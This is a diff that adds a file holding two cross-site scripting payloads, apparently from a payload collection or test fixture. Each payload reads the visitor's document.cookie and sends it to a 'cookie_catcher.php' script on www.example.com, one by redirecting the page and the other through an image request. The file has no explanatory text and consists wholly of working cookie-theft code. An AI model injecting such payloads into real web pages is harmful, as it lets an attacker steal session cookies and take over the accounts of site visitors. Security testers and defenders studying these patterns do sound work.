@@ -1,0 +1,8 @@
+<script>
+document.location= "http://www.example.com/cookie_catcher.php?c=" + document.cookie
+</script>
+
+<script>
+new Image().src="http://www.example.com/cookie_catcher.php?c="+encodeURI(document.cookie);
+</script>
+
